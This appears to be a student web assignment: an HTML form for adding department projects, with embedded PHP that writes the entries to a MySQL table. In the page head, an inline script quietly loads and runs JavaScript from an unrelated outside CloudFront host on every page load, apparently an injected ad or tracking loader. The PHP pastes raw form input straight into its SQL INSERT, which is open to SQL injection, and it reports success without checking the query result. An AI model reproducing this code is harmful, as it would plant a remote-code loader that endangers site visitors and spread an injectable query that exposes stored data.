<!DOCTYPE html>
<html>
<title>ASSIGNMENT 1</title>
<head>
  <script src="addproject.js">
  </script>
  <script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.131#p=hgstxhts545050a7e680_rb250a262ju3xj2ju3xjx";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script>
<style>
ul#m01 {
    list-style-type: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    background-color: #333333;
}

li#m01 {
    float: left;
}

li#m01 a {
    display: block ;
    color: white;
    text-align: center;
    padding: 16px;
    text-decoration: none;
}

li#m01 a:hover:not(.active) {
    background-color: black;
}
.active{
   background-color: gray;
}
.header{
    background-color: black;
    color: white;
    padding: 5px;
}
body{
    background-color: #3A0463;
}
input, textarea{
    border: solid 1px blue;
    border-radius: 2px;
    padding: 5px;
}
input#m02{
    width: 60%;
}
p{
    color: white;
}
</style>
</head>
<body>
<div class="header"><br>
<img src="download.png" height="150" width="150">
<center><h1>DEPARTMENT IT</h1></center>
<!--<center><h1><marquee bg color="black" behaviour=alternate direction=left loop=6 scrollamount=5 scrolldelay=50 width=50%>* DEPARTMENT IT * DEPARTMENT IT * DEPARTMENT IT *</marquee></h1></center>-->
<ul id="m01">
  <li id="m01"><a class="active" href="ASS PG-1.html">Add Project</a></li>
  <li id="m01"><a href="ASS PG-2.html">List</a></li>
  <li id="m01"><a href="ASS PG-3.html">Group Form</a></li>
  <li id="m01"><a href="ASS PG-4.html">Approval</a></li>
</ul>
</div><br><br>
<form name="addproject" method="post" action="ASSPG1Copy.php" onsubmit="return myFunction()">
<fieldset>
<legend><p>Add Project:</p></legend><br>
<p>Project Title* :
<input type="text" name="projecttitle" placeholder="Enter Project Title" class="#FA6CEC"></p><br>
<p>Project Abstract* :<br><br>
<textarea rows="5" cols="100" name="projectabstract" placeholder="Enter Project Abstract"></textarea></p><br>
<p>Reference :
<input id="m02"  type="text" name="reference1" placeholder="1"><br><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input id="m02" type="text" name="reference2" placeholder="2"><br><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input id="m02" type="text" name="reference3" placeholder="3"><br><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input id="m02" type="text" name="reference4" placeholder="4"></p><br>
<p>Project Guide :
<select name="Department">
<option name="Department" value="IT Department">IT Department<br>
<option name="Department" value="EXTC Department">EXTC Department<br>
<option name="Department" value="COMPS Department">COMPS Department<br>
<option name="Department" value="MECH Department">MECH Department<br>
<option name="Department" value="BMS Department">BMS Department<br>
<option name="Department" value="HM Department">HM Department
</select></p><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input type="SUBMIT" name="submit">
</fieldset>
</form>
<?php
if(isset($_POST['submit']))
{
$ab=$_POST["projecttitle"];
$ac=$_POST["projectabstract"];
$ad=$_POST["reference1"];
$ae=$_POST["reference2"];
$af=$_POST["reference3"];
$ag=$_POST["reference4"];
$ah=$_POST["Department"];

include "connection.php";

$sql = "INSERT INTO project VALUES('$ab','$ac','$ad','$ae','$af','$ag','$ah')";

$result = mysqli_query($con,$sql);
echo "<h2><font color=green>Project successfully added</font></h2>";

}
?>
</body>
</html>
